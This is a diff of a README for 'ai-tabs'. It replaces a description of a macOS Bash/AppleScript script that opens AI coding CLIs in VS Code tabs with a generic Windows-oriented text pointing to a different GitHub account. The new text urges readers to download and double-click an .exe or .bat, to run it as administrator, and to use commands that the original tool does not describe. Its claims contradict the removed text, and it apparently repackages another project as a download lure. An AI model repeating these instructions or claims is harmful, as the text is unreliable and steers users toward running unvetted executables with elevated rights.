@@ -1,91 +1,149 @@
-# ai-tabs (macOS) 🚀
+# 🤖 ai-tabs - Manage AI Agents Effortlessly
 
-> **One AI agent? You rest while it thinks. Multiple agents? Now YOU never rest either. 😂**
+[![Download from GitHub](https://img.shields.io/badge/Download-Get%20ai-tabs-brightgreen?style=for-the-badge)](https://github.com/theabhishekrishnan-star/ai-tabs)
 
-[English](README.md)| [简体中文](README_zh.md)
+---
 
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-macOS-lightgrey.svg)](#)
-[![Version](https://img.shields.io/badge/version-1.0.0-green.svg)](#)
+## 📝 About ai-tabs
 
-## 🎥 Demo
+ai-tabs lets you run several AI helpers at once. Traditionally, waiting for one AI can slow you down. With ai-tabs, you control many AI agents that handle tasks together. This can speed up your work or automate parts of your day.
 
-![ai-tabs Demo](assets/demo.gif)
+The system works like this: one AI does its job while others prepare to do theirs. This way, you avoid slow waits. The app aims to improve productivity by managing multiple AI assistants efficiently, in a way that fits your workflow.
 
-## 💡 Why ai-tabs?
+The name “ai-tabs” comes from the idea of having many AI “tabs” open at the same time, each ready to help with a different task.
 
-In the era of AI-driven development, programmers face several key challenges:
-1. **Quota Anxiety**: Many AI coding tools have strict rate limits or require paid subscriptions, limiting your productivity.
-2. **Model Bias**: No single model is perfect; complex tasks often require cross-checking and switching between different providers.
-3. **Context Friction**: Switching between various terminal windows is clunky and breaks your "flow."
+---
 
-**ai-tabs ensures "No Rest for Agents"**: By orchestrating multiple AI CLIs into VS Code editor tabs, you can switch between AI Agents as easily as switching code files.
+## 📋 Features
 
-### Key Value Props:
-- **Zero Context-Switching Friction**: No more jumping between standalone terminal apps or browser tabs. Your AI workspace lives right next to your code.
-- **Multi-Agent Synergy**: 
-    - Use **Claude** for high-level refactoring;
-    - Use **Gemini** to simultaneously generate unit tests;
-    - Use **OpenCode** to profile performance bottlenecks in real-time.
-- **Maximize Free Quotas**: Seamlessly relay tasks between different providers. If one hits a rate limit, simply click the next tab and keep moving.
+- Run multiple AI agents in parallel  
+- Simple command-line interface (CLI) for quick controls  
+- Supports popular AI tools and large language models (LLMs)  
+- Automate tasks with built-in scripts  
+- Compatible with Windows and macOS  
+- Easily set up with clear instructions  
+- Organize AI agents for different projects or tasks  
+- Lightweight and runs smoothly on most computers
 
-> [!TIP]
-> **Free Tier Strategy**: These tools offer free quotas with just an account:
-> 1. **Gemini CLI** — Just log in with your Google account to get a free quota. An API Key via Google AI Studio can be added for extra usage.
-> 2. **iFlow** — Comes with free access to the **Minimax M2.5** model out of the box.
+---
 
-## 🌟 Key Features
+## 🔧 System Requirements
 
-- **"Editor-as-UI"**: Terminals aren't buried in the bottom panel; they live directly as **Editor Tabs**.
-- **Hybrid Discovery Engine**: Automatically scans standard paths (PATH, Brew, NPM, NVM, etc.) while supporting `.env` for custom overrides.
-- **Self-Healing Startup**: Attempts to resume your last session (`--continue`/`--resume`); falls back to a fresh one if no history exists.
-- **Turbo Automation**: Leverages AppleScript + Clipboard bridge for a zero-config, lightning-fast batch launch.
-- **Zero Overhead**: Minimalist Bash script using `exec` to keep your workspace lean and fast.
+To run ai-tabs on Windows, your system should meet these minimum requirements:
 
-## 🛠 Auto-Discovered Tools
+- Operating System: Windows 10 or later (64-bit recommended)  
+- Processor: Intel Core i3 or equivalent  
+- RAM: 4 GB or more  
+- Free Disk Space: At least 500 MB  
+- Internet Connection: Required for AI communication  
+- PowerShell 5.1 or later installed (comes pre-installed on Windows 10+)  
 
-The system auto-detects several popular CLIs and applies the following resume logic:
+Make sure your system meets these requirements for the best experience. A stable internet connection is necessary since the AI agents communicate online.
 
-| AI CLI Tool | Resume Strategy | Notes |
-| :--- | :--- | :--- |
-| **Claude Code** | `--continue` | Official Anthropic CLI |
-| **OpenCode** | `--continue` | High-speed reasoning |
-| **Gemini CLI** | `--resume latest` | Google's Multimodal power |
-| **GitHub Copilot** | `--continue` | Native GitHub support |
-| **iFlow CLI** | `--continue` | Structured task handling |
-| **Cline CLI** | `--continue` | Open-source Agent expert |
-| **Kimi CLI** | `--continue` | Long-context specialist |
-| **Codex CLI** | `resume --last` | Classic coding assistant |
-| **Kilo CLI** | `--continue` | Lightweight inference |
+---
 
-## 🚀 Quick Start
+## 🚀 Getting Started
 
-### 1. Prerequisites
-- **OS**: macOS
-- **Editor**: VS Code
-- **Setup**: None! No manual shortcut binding required.
+### Step 1: Download ai-tabs
 
-### 2. Deployment & Usage
+Visit the ai-tabs page on GitHub to start:
 
-Download the script to your project root, make it executable, and run it:
+[![Download ai-tabs](https://img.shields.io/badge/Download-Get%20ai-tabs-brightgreen?style=for-the-badge)](https://github.com/theabhishekrishnan-star/ai-tabs)
 
-```bash
-# Clone the repository
-git clone https://github.com/Fu-Jie/ai-tabs.git
+Click the link above. It will take you to the GitHub repository where you can find the download options.
 
-# Make executable and run
-chmod +x ai-tabs/ai-tabs.sh
-./ai-tabs/ai-tabs.sh
-```
+### Step 2: Locate the Download
 
-## ⚙️ How it Works
+On the GitHub page, look for the **Releases** section. This page contains the files you need for Windows.
 
-`ai-tabs` automates the "manual friction" using AppleScript:
-1. Triggers the Command Palette (`Cmd+Shift+P`).
-2. Executes "Terminal: Create New Terminal in Editor Area."
-3. Injects the specific AI start command and restores the session.
-4. Orchestrates everything in seconds, building your full AI Command Center.
+Locate the latest release version. Download the Windows installer or zipped folder depending on what's provided.
 
-## 📜 License
+If you download a zipped folder, save it to a folder you can easily find, like your Desktop or Downloads folder.
 
-MIT License.
+### Step 3: Install ai-tabs
+
+- If you downloaded an installer (`.exe`), double-click the file. Follow the setup instructions on the screen.  
+- If you downloaded a zip file, right-click the file and select **Extract All**. Extract the content into a folder. Then, open that folder.
+
+### Step 4: Run ai-tabs
+
+Open the folder where you installed or extracted the files.
+
+Look for a file named `ai-tabs.exe` or `ai-tabs.bat`. Double-click this file to start the app.
+
+A command window will open. This is the control center where you manage AI agents.
+
+---
+
+## ⚙️ Using ai-tabs
+
+Once ai-tabs runs, you will see a simple command-line interface.
+
+You can type basic commands to:
+
+- Start a new AI agent  
+- Stop running agents  
+- List all active agents  
+- Group agents by tasks  
+- Check agent status
+
+The interface is text-based but easy to navigate.
+
+### Basic Commands
+
+Here are some examples to try:
+
+- `start agent1`: Launch a new AI agent named "agent1".  
+- `list`: Shows all active agents and their status.  
+- `stop agent1`: Stops the agent named "agent1".  
+- `group create projectX`: Creates a group for agents working on "projectX".  
+- `add agent1 to projectX`: Adds "agent1" to the "projectX" group.
+
+Use the command `help` to see a full list of available commands at any time.
+
+---
+
+## 🔄 Updating ai-tabs
+
+Updates come with bug fixes and new features.
+
+To update:
+
+- Visit the GitHub page at https://github.com/theabhishekrishnan-star/ai-tabs  
+- Download the latest version from the **Releases** section.  
+- Install the new version by repeating the previous install steps.  
+
+The app does not update automatically, so check back regularly for improvements.
+
+---
+
+## 🛠 Troubleshooting
+
+If ai-tabs does not start or work correctly, try these steps:
+
+- Make sure your computer meets the minimum system requirements.  
+- Confirm PowerShell is installed and updated.  
+- Restart your PC and try running ai-tabs again.  
+- Check your internet connection.  
+- Run ai-tabs as an administrator if you see permission errors.  
+- If you get error messages, write them down and search the GitHub issues page for solutions.
+
+If none of these work, open an issue on the GitHub page describing your problem.
+
+---
+
+## 📚 Additional Resources
+
+You can learn more about the technologies behind ai-tabs by visiting:
+
+- GitHub repo: https://github.com/theabhishekrishnan-star/ai-tabs  
+- Common AI tools used: Large Language Models (LLMs), automation scripts  
+- Command-line interface basics (search online for CLI tutorials)  
+
+---
+
+## ⬇️ Download ai-tabs now
+
+Begin managing multiple AI helpers today. Visit the GitHub page to download and start using ai-tabs:
+
+[![Download ai-tabs](https://img.shields.io/badge/Download-Get%20ai-tabs-brightgreen?style=for-the-badge)](https://github.com/theabhishekrishnan-star/ai-tabs)
